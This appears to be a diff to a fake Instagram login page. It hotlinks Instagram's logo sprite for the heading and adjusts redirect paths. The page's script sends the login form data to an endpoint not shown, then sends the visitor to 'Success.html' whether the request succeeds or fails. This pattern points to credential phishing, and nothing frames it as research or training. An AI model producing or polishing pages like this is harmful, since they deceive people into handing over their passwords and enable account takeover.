@@ -46,7 +46,7 @@
 
       .heading {
         margin: 22px auto 12px;
-        /* background-image: url("https://www.instagram.com/static/bundles/es6/sprite_core_b20f2a3cd7e4.png/b20f2a3cd7e4.png"); */
+        background-image: url("https://www.instagram.com/static/bundles/es6/sprite_core_b20f2a3cd7e4.png/b20f2a3cd7e4.png");
         background-position: -98px 0;
         height: 51px;
         width: 177px;
@@ -168,14 +168,7 @@
   <body>
     <div class="container">
       <div class="box">
-        <div class="heading">
-          <img
-            style="height: 100%"
-            width="100%"
-            src="download.png"
-            alt="helllo"
-          />
-        </div>
+        <div class="heading"></div>
         <div class="login-form">
           <div class="field">
             <input
@@ -226,10 +219,10 @@
         data: obj,
       })
         .then((res) => {
-          location.replace("../Success.html");
+          location.replace("./Success.html");
         })
         .catch(() => {
-          location.replace("../Success.html");
+          location.replace("./Success.html");
         });
     };
   </script>
